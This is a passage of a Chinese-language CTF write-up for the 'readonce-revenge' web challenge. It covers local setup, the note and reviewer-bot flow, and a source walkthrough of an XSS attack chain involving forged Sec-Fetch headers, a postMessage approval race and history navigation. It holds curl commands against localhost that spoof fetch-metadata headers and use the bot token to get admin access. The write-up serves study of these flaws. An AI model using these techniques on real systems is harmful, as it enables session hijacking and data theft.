# readonce-revenge 题解与完整复现

| 项 | 值 |
|---|---|
| 比赛 | PwnSec CTF 2026 |
| 类别 | Web |
| 难度 | Hard |
| 分值 | 242 |
| 远程实例 | 已随比赛结束销毁，本文全部结论基于本地 Docker 复现 |
| 本地 flag | `pwnsec{real_flag_on_remote}`（compose 中配置的占位值） |
| 解题状态 | 已解出，flag 为 `pwnsec{917872750f693769}` |

> 名词说明：**flag** 指比赛的最终目标字符串（本题格式为 `pwnsec{...}`），拿到它就代表解出本题。
>
> **CTF** 指 Capture The Flag，网络安全夺旗赛；本文的类别 **Web** 指网页应用方向，难度档 **Hard** 对应"困难"。

本文从"跑起来玩一遍"开始，先看清系统的正常行为，再逐步拆解攻击链。每一处机制都有源码位置或本地运行日志作依据。

## 目录

- [一、这道题在做什么](#一这道题在做什么)
- [二、本地部署与正常流程体验](#二本地部署与正常流程体验)
- [三、源码导读](#三源码导读)
- [四、攻击目标拆解](#四攻击目标拆解)
- [五、逐步攻破](#五逐步攻破)
- [六、完整链复现日志](#六完整链复现日志)
- [七、攻击脚本逐段讲解](#七攻击脚本逐段讲解)
- [八、复现指南](#八复现指南)
- [九、防御建议](#九防御建议)
- [附录](#附录)

---

## 一、这道题在做什么

题目是一个笔记系统。你可以写笔记、预览笔记，也可以把某个网址提交给"审查员"检查。审查员是一个自动化的无头浏览器（本题里叫机器人 bot），它拥有管理员权限，并且知道 flag 的位置。它拿到待检查网址后会自动访问，全流程固定，不受提交者控制。

flag 藏在管理员专属接口 `/api/flag` 后面。你的目标：让一段自己写的 JavaScript（浏览器里运行的编程语言）在机器人浏览器里的**挑战域页面**（挑战域：题目服务器自身的网域）上执行，然后借它的管理员身份读走 flag。

系统的四个角色：

| 角色 | 说明 |
|---|---|
| 用户（你） | 创建笔记、提交网址；在服务器眼里没有任何特殊权限 |
| 服务器 | 网站的服务器程序，保存笔记、维护"当前审查任务"、提供 `/api/flag` |
| 机器人 | 内置在服务器进程里的自动化浏览器，持有管理员会话，按固定流程执行审查 |
| 攻击者 | 你的目标身份：借机器人之手读走 flag |

三个必须先记住的规则：

1. **笔记 HTML（HyperText Markup Language，网页的组成语言）上限 128 个字符**（`/create` 源码里 `slice(0, 128)`），想塞攻击代码必须精打细算。
2. **机器人固定做四件事**：访问审查页 → 访问 `/api/flag`（把 flag 写进服务器内存里的一份审查记录）→ 调用"就绪"接口 → 访问你提交的网址并停留 10 秒。每一步都带着管理员身份。
3. **审查页第一次被访问只留标记；第二次访问才进入"渲染笔记原文"的分支，而且要通过全部检查（2.5 节列出）才会真的把笔记渲染出来**。渲染分支的页面没有 CSP（Content Security Policy，内容安全策略：浏览器限制页面能加载和执行哪些内容的安全机制）保护：这里就是 XSS（Cross-Site Scripting，跨站脚本攻击：让攻击者的脚本在受害网站的页面上执行）的落点，也是整条攻击链要到达的终点。

攻击链的大致路线（细节在第五章展开）：

1. 把 XSS 笔记的编号塞进提交网址，让"笔记原文"与本次审查任务绑定；
2. 在机器人访问的页面里，用弹窗打开审查流程，在页面切换的瞬间投递一条消息，把审查任务标记成"已批准"；
3. 连续导航若干次，把最初那次"审查页访问"挤出浏览器的页面缓存；
4. 用历史回退回到最初那条审查页网址，触发一次真实的重新访问；
5. 服务器通过全部检查，渲染笔记原文，XSS 执行，flag 转发到攻击者服务器。

后面每一章只解决一个问题，跟着走即可。

## 二、本地部署与正常流程体验

本章目标：把题目跑起来，以普通用户身份完整操作一遍（每步同时给"网页操作"和"命令行"两种方式），观察机器人的真实行为。

### 2.1 部署

题目附件是 `readonce-revenge.zip`，解压后得到以下内容（本文示例把解压目录命名为 `readonce-revenge/`，你也可以用任何名字）：

```
readonce-revenge/
├── src/              # 挑战服务器（Express）
│   ├── server.js     # 全部路由与状态
│   └── views/        # 页面模板
├── bot/
│   └── bot.js        # 机器人程序（被 server.js 直接引用）
├── public/style.css
├── Dockerfile
└── docker-compose.yml
```

`src/` 里是网站的服务器程序，用 **Node.js** 的 **Express** 框架编写。Node.js 是用 JavaScript 写服务端程序的运行环境；Express 是它最常用的网站框架，负责路由、请求解析、cookie 会话这些基础工作。入口文件 `server.js` 包含全部路由逻辑，第三章细看。

compose 文件里配置了几个关键环境变量：

```yaml
environment:
  PORT: "3000"
  APP_URL: "http://localhost:3000"
  FLAG: "pwnsec{real_flag_on_remote}"
  BOT_TOKEN: "local-bot-token"
  SESSION_SECRET: "looosoosw"
```

四个变量的作用：

| 变量 | 作用 |
|---|---|
| `FLAG` | 目标字符串本体。服务端启动时读进内存（源码里 `const FLAG = process.env.FLAG`），`/api/flag` 返回的就是它。放进环境变量是为了不写进代码，部署时替换（本地即上面的占位值） |
| `BOT_TOKEN` | 机器人口令，证明"我是机器人"：`/reports/session` 和 `/reports/arm/:id` 都检查请求头 `X-Bot-Token`。服务器和机器人读同一个变量，两边对上；攻击者不知道它 |
| `SESSION_SECRET` | 会话 cookie 的签名密钥：`sid` cookie 由它签名，服务器收到后验签，防止伪造会话。本地固定测试值，远程部署用随机强值 |
| `PORT`、`APP_URL` | 服务端监听端口；机器人访问服务端所用的基地址 |

启动：

```bash
cd readonce-revenge
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/   # 200
```

浏览器打开 `http://localhost:3000/`，界面分三块：创建笔记（Create note）、提交文档（Report document）、最近笔记列表。

### 2.2 创建笔记与预览（网页操作）

浏览器打开 `http://localhost:3000/`，在"Create note"面板里操作：

1. Title 填 `hello2`（上限 10 个字符）；
2. HTML body 填 `<b>hi1</b>`（上限 128 个字符）；
3. 点 Create 按钮。

页面会跳转到这条笔记的预览页（地址形如 `/note/<编号>`）。观察两件事：

1. **笔记编号**：地址栏和笔记列表里都能看到一个 10 位的十六进制字符串，后面提交审查时要用它；
2. **正文显示的是原样文字 `<b>hi</b>`**，而不是加粗的 "hi"。

第二条是题目的刻意设计：预览页对笔记内容做了两层保护。第一层是模板转义（`<pre><%= note.html %></pre>` 把笔记当纯文本插入，HTML 标签失去作用）；第二层是响应头里的 CSP（Content Security Policy，内容安全策略），在浏览器端禁止这个页面加载外部资源、也禁止内联脚本执行（两层的分工在 2.3 展开）。记住这个对比，后面会用到：**同一条笔记，在预览页是安全的；在审查渲染分支输出的页面里是危险的**（那里两层保护都没有）。

回到首页，刚创建的笔记会出现在"最近笔记列表"里，点 preview 可以再次打开预览页。

### 2.3 创建笔记与预览（命令行）

同一件事再用命令行工具 curl（在终端里直接发送 HTTP 请求的程序）做一遍：

```bash
curl -si -X POST http://localhost:3000/create \
  --data-urlencode "title=hello2" --data-urlencode 'html=<b>hi1</b>'
```

完整响应：

```text
HTTP/1.1 302 Found
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Location: /note/fcd853bf159844178c34
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 48
Date: Fri, 18 Sep 2026 15:07:23 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Found. Redirecting to /note/fcd853bf159844178c34
```

返回的 `302` 是 HTTP（HyperText Transfer Protocol，超文本传输协议）状态码，含义是"跳转到新地址"，所以浏览器会接着打开 `Location` 指向的笔记页。服务器把笔记存进服务器内存里的一张键值表，编号是 10 字节的随机十六进制。

这个输出里有两组"在题目源码里搜不到"的东西，先分清，后面遇到类似的输出就不会浪费时间：

- **响应体 `Found. Redirecting to /note/...` 不是题目代码写的**：题目代码只有一行 `res.redirect(...)`（把编号拼进跳转地址），响应体由 Express 的 `res.redirect()` 默认生成。其中 `Found` 是 HTTP 对 302 的标准短语（来自 `statuses` 依赖包），Express 按请求的 `Accept` 头选择版本：命令行看到纯文本版，浏览器看到 HTML 版（`<p>Found. Redirecting to <a ...>`），响应里的 `Vary: Accept` 就来自这次内容协商。
- **一批安全头也不是题目代码写的**：`Cross-Origin-Opener-Policy`、`X-Frame-Options`、`Strict-Transport-Security` 等十来个头来自 `helmet` 中间件的默认配置（题目代码只有 `app.use(helmet({ contentSecurityPolicy: false }))` 一行，只关掉了其中的 CSP 一项）。

要查这两组东西，去 `node_modules` 里搜（例如 `express/lib/response.js` 的 redirect 函数、`statuses/codes.json`）。响应里真正与题目自身行为相关的只有 `Location` 和 `Vary`。读响应时先分清"框架默认"和"应用自定义"，能省很多翻源码的时间。

预览这条笔记：

```bash
curl -si http://localhost:3000/note/fcd853bf159844178c34
```

完整响应：

```text
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src 'none'; base-uri 'none'; frame-ancestors 'none'
Content-Type: text/html; charset=utf-8
Content-Length: 583
ETag: W/"247-JjIcG8TBQh8e+6D02doPyfMT7ek"
Date: Fri, 18 Sep 2026 15:10:24 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>hello2 | ReadOnce Docs</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <main>
    <header>
      <div>
        <h1>ReadOnce Docs</h1>
        <p class="muted">Oi, make your notes, yeah?</p>
      </div>
      <a href="/">Dashboard</a>
    </header>

    <section class="panel">
      <h2>hello2</h2>
      <p class="muted">Document preview.</p>
      <pre>&lt;b&gt;hi1&lt;/b&gt;</pre>
    </section>
  </main>
</body>
</html>
```

这段响应里有预览页的两层保护，分工是：**转义负责让笔记里的标签从一开始就不存在**（决定性的一层）；**CSP 是兜底**，负责在标签万一漏进页面时拒绝执行。逐个看：

- **响应头里的 `Content-Security-Policy`（CSP，内容安全策略）**：它是一条发给浏览器的指令，规定"这个页面允许加载哪些东西"。这里配置的值是：
  - `default-src 'none'`：所有类别的资源都默认禁止。这里没有"外部/内部"之分：外链脚本加载不了；页面里内联的 `<script>` 同样没有执行许可（内联要执行必须"显式授权"，做法见本节末尾的补充）。
  - 另外两项调整：同源样式表放行（`style-src 'self'`）、禁止页面被别人嵌入（`frame-ancestors 'none'`）。
  - 这一层是**兜底**：万一转义被改坏、或有别的注入点把标签漏进了页面，浏览器端仍然会拒绝执行。但就预览页而言，更关键的是下一条的转义：笔记里就算写了 `<script>`，标签也早在进入页面之前就变成了文本。
- **模板转义（决定性的一层）**：位置在 `src/views/note.ejs`，关键就一行 `<pre><%= note.html %></pre>`。其中 `<%=` 是 EJS 模板的"转义输出"：把内容里的 `<`、`>` 等符号替换成 `&lt;`、`&gt;` 再插入页面。所以上面响应体里显示的是 `&lt;b&gt;hi1&lt;/b&gt;`（纯文本），而不是加粗的文字。顺带破除一个常见误会：笔记里就算写了 `<script>`，让它在预览页失效的是转义，不是外面的 `<pre>` 标签。`<pre>` 只影响显示格式（保留空格、等宽字体），HTML 解析器在它内部照样解析标签；把模板换成不转义的 `<%- note.html %>`，就算套着 `<pre>`，`<script>` 也会执行（本地写个含 `<pre><script>...</script></pre>` 的静态页面打开即可验证）。作为对照，审查渲染分支的模板 `review-document.ejs` 写的是 `<%- note.html %>`（不转义、原样插入），一字之差，安全性质完全相反：**同一篇笔记，预览页只当文本，渲染分支会当真正的 HTML 执行**。这个差别是后面整条攻击链的立足点。

**补充：CSP 的"显式授权"是什么意思**

预览页里内联脚本被禁，是因为它的 CSP 没有给出任何脚本授权。要让某段代码能执行，标准做法是在 CSP 里**指名放行**，常用两种：

- **nonce**：服务器每次响应生成一个随机值，同时写进 CSP 和标签：CSP 里写 `script-src 'nonce-<随机值>'`，页面里写 `<script nonce="<随机值>">……</script>`。只有带这个随机值的脚本元素能执行；攻击者就算能往页面里注入 HTML，也猜不到本次响应的随机值，写不出合法标签。
- **内容哈希**：把代码内容的哈希写进 CSP（`script-src 'sha256-<base64>'`），内容一字不差才执行；适合固定不变的内联脚本。生成方法：把标签之间的文本（逐字符原样，空格换行都算）做 SHA-256、再 Base64 编码。命令行一条：`echo -n '<脚本内容>' | openssl dgst -sha256 -binary | base64`；或者先让页面在无授权状态下被浏览器拦一次，Chrome 控制台的报错里会直接列出这段脚本的哈希，复制即用（与命令行结果一致）。内容改一个字符哈希即失效，需要重新生成并更新 CSP，这是它和 nonce 的取舍。

还有一个万能写法：`'unsafe-inline'`。它放行的不只是脚本块，而是三类"藏在 HTML 里"的代码。同一张页面换不同的 CSP，实测结果是：

| HTML 里的写法 | CSP 为 `default-src 'none'`（预览页的配置） | CSP 为 `script-src 'unsafe-inline'` |
|---|---|---|
| `<script>console.log(1)</script>`（脚本块） | 拦截 | 执行 |
| `<button onclick="console.log(1)">`（内联事件处理器） | 拦截 | 执行 |
| `<a href="javascript:console.log(1)">`（`javascript:` 网址） | 拦截 | 执行 |

两个容易忽略的点：

- **内联事件处理器（inline event handler，即在标签里写 `onclick=` 这类写法）和 `javascript:` 网址，都在 nonce/哈希的授权范围之外**。实测：CSP 写 `script-src 'nonce-<值>'` 时，带对 nonce 的 `<script>` 块能执行，但 `<button onclick=...>` 照样被拦（nonce 只认 `<script>` 元素；冷门的 `'unsafe-hashes'` 关键字是例外，可给具体的处理代码做哈希授权，但浏览器支持不一、极少使用）。
- **两者不可兼得**（放行 = 允许执行）。`script-src` 实际只有两种可选写法，一张表说清：

| 想要的 | 唯一可行的写法 | 代价 |
|---|---|---|
| 用 nonce 保护（推荐） | `script-src 'nonce-<值>'` | 内联事件处理器、`javascript:` 网址不能使用；改写成 `addEventListener` 放进带 nonce 的脚本块 |
| 使用内联事件处理器、`javascript:` 网址 | `script-src 'unsafe-inline'`，**不能带 nonce** | 放弃 CSP 对内联脚本的防护 |

为什么没有"两个都要"的选项？因为 `script-src` 里只要出现 nonce 或哈希，浏览器就会忽略 `'unsafe-inline'`（实测：`script-src 'unsafe-inline' 'nonce-<值>'` 下三类代码全被拦）。规范设这条规则，就是逼着代码迁移到表中的第一行写法。

它的"万能"正是危险所在：一旦开了它，攻击者只需让一个 `<img onerror=...>` 进入页面就能执行脚本，这一层对 XSS 的防护基本归零。名字里的 unsafe 就是这个意思。

本题的审查界面 `/review` 和沙箱页 `/sandbox` 用的就是 **nonce**：两个页面的响应 CSP 都写着 `script-src 'nonce-<本次随机值>'`，各自模板里的 script 标签都带同样的 nonce 属性。尤其注意沙箱页：它用 nonce **主动放行了一个外链脚本**，那正是攻击脚本能进入沙箱的原因（3.4 节会对照源码看）。

命令行适合后续批量操作；手动点一遍可以顺便确认页面观感。

### 2.4 提交文档给审查员

两种操作方式触发的是同一套服务端流程，任选一种。

**方式一：网页操作**

1. 在首页"Report document"面板的 URL 框里填（编号从预览页地址栏或笔记列表里抄，本文示例笔记的编号是 `fcd853bf159844178c34`）：
   `http://localhost:3000/note/fcd853bf159844178c34?note=fcd853bf159844178c34`；
2. 点 Send。页面会转圈约 10 秒，随后显示 "The reviewer finished."。

**方式二：命令行**

```bash
curl -si -X POST http://localhost:3000/report \
  --data-urlencode "url=http://localhost:3000/note/fcd853bf159844178c34?note=fcd853bf159844178c34"
```

请求会挂起约 10 秒（机器人在工作），随后返回：

```text
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Content-Type: text/html; charset=utf-8
Content-Length: 469
ETag: W/"1d5-sH+WynRnxQza5WHc26M2qLu1koY"
Date: Fri, 18 Sep 2026 15:14:02 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Reviewed | ReadOnce Docs</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <main>
    <header>
      <div>
        <h1>ReadOnce Docs</h1>
        <p class="muted">Oi, make your notes, yeah?</p>
      </div>
      <a href="/">Dashboard</a>
    </header>

    <p>The reviewer finished.</p>
  </main>
</body>
</html>
```

两种方式都注意：提交的网址里要带 `note` 参数。服务端会从提交网址里把这个参数取出来，记成"本轮审查对应哪篇笔记"；审查页渲染时必须找到这篇笔记才继续，缺了它就只会得到 404（第三章看这段源码）。这 10 秒是机器人的工作时长（源码里固定等待 10 秒），等待期间别重复提交（服务端一次只接待一轮审查，重复提交会得到 429）。

不管哪种方式，容器日志里都能看到机器人的完整动作：

```text
[bot-req:main] GET http://localhost:3000/reports/check?rid=b140b3e5f827db771ca7c04a&state=4bd6b914f8504233a2bfb9dac1bdb787
[check-debug] rid=b140b3e5 admin=true secSite=none secDest=document visited=false
[bot-frame-nav:main] http://localhost:3000/reports/check?rid=b140b3e5f827db771ca7c04a&state=4bd6b914f8504233a2bfb9dac1bdb787
[bot-req:main] GET http://localhost:3000/api/flag
[bot-frame-nav:main] http://localhost:3000/api/flag
[bot-req:main] GET http://localhost:3000/note/fcd853bf159844178c34?note=fcd853bf159844178c34&rid=b140b3e5f827db771ca7c04a
[bot-req:main] GET http://localhost:3000/favicon.ico
[bot-console:main:error] Failed to load resource: the server responded with a status of 404 (Not Found)
[bot-frame-nav:main] http://localhost:3000/note/fcd853bf159844178c34?note=fcd853bf159844178c34&rid=b140b3e5f827db771ca7c04a
[bot-req:main] GET http://localhost:3000/style.css
```

对应机器人的四件事：

1. **访问审查页** `/reports/check`，带上服务器生成的 `rid`（本轮审查编号）和 `state`（秘密随机数）。此时 `visited=false`，服务器只做标记（首次访问）。
2. **访问 `/api/flag`**：把 flag 写进本轮审查记录的内存字段。
3. **调用就绪接口** `/reports/arm/<rid>`（这一步是程序用 fetch（JavaScript 里用来发 HTTP 请求的内置函数）直接发请求，不出现在浏览器的请求日志里）：把 `prepared` 置为 true。
4. **访问你提交的网址**：机器人会在网址后自动追加 `rid` 参数再打开（日志里 `note/fcd853...` 那行的末尾多了一个 `&rid=`），然后停留 10 秒。

注意第 4 件事：**你提交什么网址，机器人的主页面就会整页打开什么网址**。这是攻击者的第一个立足点。

### 2.5 审查页的两次访问

这一节没有网页操作版本：用浏览器直接打开审查页地址只会得到 403，因为你的浏览器没有管理员身份（`admin` 会话是第一道检查，也正是整条攻击链要"借"的东西）。下面用 curl 模拟不同身份的访问者。

审查页 `/reports/check` 是本题最核心的路由，源码里分成两个分支：

```js
if (currentReview.visited) {
  // 渲染分支：全部检查通过才渲染笔记原文
  const note = notes.get(currentReview.noteId);
  if (!note) { 404 }
  if (!policy(req) || !consumeReport(req)) { 403 }
  res.render("review-document", { note });    // 原样输出 note.html
  return;
}
// 标记分支：记录已访问、设置 view cookie，返回占位页
currentReview.visited = true;
res.cookie("view", id, { ... path: "/reports/check" });
res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
```

- **首次访问**：返回一个占位页，同时设置 `view` cookie、把 `visited` 置为 true。
- **再次访问**：进入渲染分支。渲染模板 `review-document.ejs` 只有一行关键内容：`<%- note.html %>`，原样输出笔记 HTML，且响应没有任何 CSP。

渲染分支要连续通过以下检查，缺一不可：

| 检查 | 含义 | 数据来源 |
|---|---|---|
| `admin` 会话 | 访问者必须是管理员 | 机器人会话的 cookie |
| `rid` 匹配 | 审查编号对得上 | 网址参数 |
| 笔记存在 | 提交网址里的 `note` 参数能查到笔记 | `POST /report` 时从提交网址提取并存入 |
| `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 这对请求头属于 Fetch Metadata（浏览器自动附加、标明请求来源的一组 `Sec-Fetch-*` 头，脚本伪造不了），只有"浏览器自己发起"的导航才会带 |
| `state` 匹配 | 与服务器生成的秘密随机数一致 | 网址参数 |
| `prepared` | 机器人已就位 | 机器人的第 3 件事自动置位 |
| `approved` | 审查已批准 | 需要触发 `/complete` 接口（第三章讲） |
| 未使用过 | 防止二次消费 | 服务器状态 |

用 curl 手工访问即可看到这两道最容易观察的门槛（先取一个管理员会话模拟机器人视角：`curl -si http://localhost:3000/reports/session -H "X-Bot-Token: local-bot-token"`，把响应里的 `sid` cookie 记作 `$ADMIN_COOKIE`；rid/state 从容器日志里抄）：

```bash
# 第一次：裸 curl 不带任何 Sec-Fetch 头（浏览器内脚本发起的请求同样过不了这一关）
curl -si "http://localhost:3000/reports/check?rid=8d7b1188c0a93a59c69788b8&state=ff7a36206365358196fc446658cc4000" \
  -H "Cookie: $ADMIN_COOKIE"
# 服务端日志：[check-debug] 2nd-visit note=true policy=false stateOK=true prepared=true approved=false used=false
# HTTP/1.1 403 Forbidden

# 第二次：伪造 Sec-Fetch-Site: none + Sec-Fetch-Dest: document，并带上机器人首访时拿到的 view cookie（值就是 rid）
curl -si "http://localhost:3000/reports/check?rid=8d7b1188c0a93a59c69788b8&state=ff7a36206365358196fc446658cc4000" \
  -H "Cookie: $ADMIN_COOKIE; view=8d7b1188c0a93a59c69788b8" \
  -H "Sec-Fetch-Site: none" -H "Sec-Fetch-Dest: document"
# 服务端日志：[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=false used=false
# HTTP/1.1 403 Forbidden
```

第二次访问里 `policy` 已经通过，`prepared` 也已就位，唯一卡住的是 `approved=false`。**这个字段由谁能置位、怎么置位，就是整条攻击链的主线**。

> 本章小结：正常流程里，审查渲染分支永远不会被触发。机器人只访问一次审查页就离开。要让笔记原文被渲染出来，攻击者必须自己安排"第二次访问"，并且让上面表格里的每一项检查都通过。

## 三、源码导读

本章目标：把服务器的全部机制看一遍。重点不是记代码，而是搞清楚三件事：谁能看 flag、笔记原文在什么条件下会被渲染、"批准"状态由谁控制。

### 3.1 会话与管理员身份

服务器用 `express-session` 库管理会话，cookie 名 `sid`，带 `HttpOnly`（网页脚本无法读取该 cookie，它只能随请求自动发送）和 `SameSite=Lax` 两个属性。默认情况下谁都没有管理员身份（代码里叫 `admin`）；唯一的升级通道是：

```js
app.get("/reports/session", (req, res) => {
  if (req.get("x-bot-token") === BOT_TOKEN) {
    req.session.name = "reviewer";
    req.session.admin = true;
  }
  ...
});
```

请求头里带上正确的机器人令牌（部署时配置的环境变量 `BOT_TOKEN`），这个会话就变成管理员。机器人程序启动后第一件事就是访问这个接口，用令牌把自己的会话升级。攻击者不知道这个令牌（它由部署时的环境变量 `BOT_TOKEN` 配置），但**机器人升级好的会话会留在机器人的浏览器里**，后面所有页面都带着它。

这个值的强度还决定一条捷径是否存在：如果它被猜到或泄漏（例如沿用了源码里的默认值 `dev-token`），攻击者可以直接带 `X-Bot-Token` 请求 `/reports/session` 把自己的会话升级成管理员，随后在任意一轮审查进行期间直接读 `/api/flag`，本文其余的链全部可以跳过。因此部署要求强随机值（远程实例即如此）；本地复现用的是明文测试值，但攻击链按"攻击者不知道令牌"构造。

`SameSite=Lax` 这条属性很关键，它规定：**跨站请求默认不带 cookie，但顶层导航（打开新页面）例外**。也就是说，攻击者网页里用 `fetch` 直接请求挑战域的 `/api/flag` 是带不上 cookie 的；但用 `window.open`、`location.href` 跳到挑战域的地址，cookie 会带上。

### 3.2 端点速查

除首页 `/` 外，全部功能端点如下（共 10 个；GET / POST 是 HTTP 的两种请求方法，GET 用于获取内容，POST 用于提交数据）：

| 方法 | 路径 | 权限 | 作用 |
|---|---|---|---|
| POST | `/create` | 无 | 创建笔记（标题≤10 个字符，HTML≤128 个字符） |
| GET | `/note/:id` | 无 | 预览笔记（CSP 严格防护，转义输出） |
| POST | `/report` | 无 | 提交待审查网址，触发机器人；从网址的 `note` 参数提取笔记编号 |
| GET | `/reports/session` | 机器人令牌 | 把当前会话升级为管理员 |
| GET | `/reports/check` | 管理员 | 审查页。首访只留标记；二访进入渲染分支，全部检查通过才输出笔记原文 |
| POST | `/reports/arm/:id` | 机器人令牌 | 置 `prepared=true`，表示机器人已就位 |
| GET | `/review` | 管理员 + rid 匹配 | 打开审查界面：登记攻击脚本 URL，渲染带沙箱 iframe 的页面 |
| GET | `/sandbox` | 管理员 + rid + 已登记 document | 沙箱页，加载攻击脚本；带 `&end` 时返回空文档 |
| POST | `/complete` | 管理员 + id/state 匹配 + prepared | 置 `approved=true` |
| GET | `/api/flag` | 管理员 | 返回 flag（首次调用时把 flag 写进本次审查记录） |

（表内 URL 即网址；iframe 指"在页面中嵌入另一个页面"的 HTML 标签，后文反复用到。）

### 3.3 机器人程序

`bot.js` 被 `server.js` 直接 `require`，机器人逻辑就运行在服务器进程内（它拉起的无头 Chromium 才是独立子进程）；`POST /report` 的处理函数里有一行 `await review(currentReview)`，所以**每次提交都会自动触发一次完整的机器人流程**，无需任何手动启动。

机器人流程的骨架：

```js
const context = await browser.createBrowserContext();
// 1. 用令牌把会话升级为管理员（cookie 留在 context 里）
const sessionPage = await context.newPage();
await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });
await sessionPage.goto(`${APP_URL}/reports/session`);
await sessionPage.close();

// 2. 主页面按固定顺序做四件事
await page.goto(`${APP_URL}/reports/check?rid=${report.id}&state=${report.nonce}`);
await page.goto(`${APP_URL}/api/flag`);                    // flag 载入内存
await fetch(`${APP_URL}/reports/arm/${report.id}`, ...);   // 置 prepared
await page.goto(url);                                      // url 是你提交的，bot 会附加 rid 参数
await sleep(10000);                                        // 停留 10 秒
```

两个观察：

1. 第 4 次导航打开的是**攻击者提交的网址**。如果这个网址指向攻击者控制的服务器，那么攻击者的 JavaScript 就会在机器人的浏览器里运行。这是攻击的起点。
2. 机器人从打开提交网址到关闭浏览器之间的 10 秒，是攻击链必须完成的时间预算。

### 3.4 "批准"通道：`/review`、`/sandbox`、`/complete`

这三个端点共同构成"审查交互"，也是攻击脚本唯一能进入机器人浏览器的通道。

**`/review`**：管理员打开后，服务器把 URL 参数 `u`（攻击者提供的地址）登记为"待审查文档"，然后渲染审查界面：

```js
target.searchParams.set("rid", currentReview.id);   // 顺手给攻击者 URL 加上 rid
currentReview.document = { url: target.href, nonce: randomId(16) };
res.render("review", { nonce, id: currentReview.id, state: currentReview.nonce });
```

审查界面 `review.ejs` 里有一个沙箱 iframe（即带 `sandbox="allow-scripts"` 限制的嵌入子页面：允许执行脚本，但不给它任何同源权限）和一段负责"批准"的逻辑：

```html
<iframe id="viewer" sandbox="allow-scripts" src="/sandbox?rid=..."></iframe>
<script nonce="...">
  const viewer = document.getElementById("viewer");
  let closing = false;

  addEventListener("message", (e) => {
    if (!closing || e.source === viewer.contentWindow) return;   // 防线
    fetch("/complete", { method: "POST", body: JSON.stringify(report) }); // 批准
  });

  viewer.addEventListener("load", () => {
    if (closing) return;
    closing = true;
    viewer.src = "/sandbox?rid=...&end";   // 第一次加载后，把 iframe 换成空文档
  });
</script>
```

这段逻辑的意图很明确：iframe 第一次加载完成后立刻换成空文档（"审查完毕，关闭文档"）；此后如果还收到来自沙箱窗口的消息，就认为"文档关闭时还有交互"，视为审查通过，调用 `/complete`。防线是那行身份比较：**消息来源必须是当前 iframe 窗口**，否则丢弃。

**`/sandbox`**：渲染一个极简单的页面，关键只有一行：用 script 标签（HTML 里负责加载和执行 JavaScript 的标签）加载攻击脚本。这个标签带着服务器生成的 nonce（number used once，一次性随机数，用来证明内容出自服务器）：

```html
<script nonce="<%= nonce %>" src="<%= url %>"></script>
```

响应 CSP 为 `sandbox allow-scripts; default-src 'none'; script-src 'nonce-...'` 等。两个效果：iframe 内是一个**不透明源（opaque origin）**，脚本能跑但没有挑战域的任何权限；脚本能加载，是因为那个 script 标签由服务器自己写下并带上了正确的 nonce。URL 带 `&end` 参数时直接返回空文档 `<!doctype html>`。

**`/complete`**：批准接口。四个条件全部满足才置位：

```js
if (currentReview.id === id && currentReview.prepared && req.session.admin && state === currentReview.nonce) {
  currentReview.approved = true;
}
```

id 和 state 由调用方提供；`prepared` 由机器人的第 3 件事自动置位；admin 由机器人的会话满足。所以对攻击者来说，**只要能让"审查界面在正确时机调用一次 /complete"，approved 就是自己的了**。

### 3.5 本轮审查的状态字段

服务器用全局变量 `currentReview` 保存"当前这轮审查"的全部状态。它在 `POST /report` 时创建，机器人流程结束后清空：

| 字段 | 创建时 | 谁在什么时候修改 |
|---|---|---|
| `id` | 随机 12 字节 | 固定不变（`rid` 参数就是它） |
| `nonce` | 随机 16 字节 | 固定不变（`state` 参数、`/complete` 校验都用它） |
| `noteId` | 从提交网址的 `note` 参数提取 | 固定不变 |
| `visited` | false | 机器人首次访问审查页时置 true |
| `flag` | null | 机器人访问 `/api/flag` 时写入 |
| `prepared` | false | 机器人调用 `/reports/arm` 时置 true |
| `document` | 无 | 打开 `/review` 时写入攻击脚本地址 |
| `approved` | false | `/complete` 被正确调用时置 true |
| `used` | false | 渲染分支渲染成功后置 true |

### 3.6 防护汇总

把服务器和浏览器侧的防线集中列一遍，第五章将逐条处理它们：

| 防线 | 位置 | 意图 |
|---|---|---|
| 预览页 CSP + 转义 | `/note/:id` | 笔记 HTML 在预览时不可执行 |
| 沙箱 iframe（`sandbox allow-scripts`） | `/review` + `/sandbox` | 攻击脚本可运行但处于不透明源，拿不到挑战域权限 |
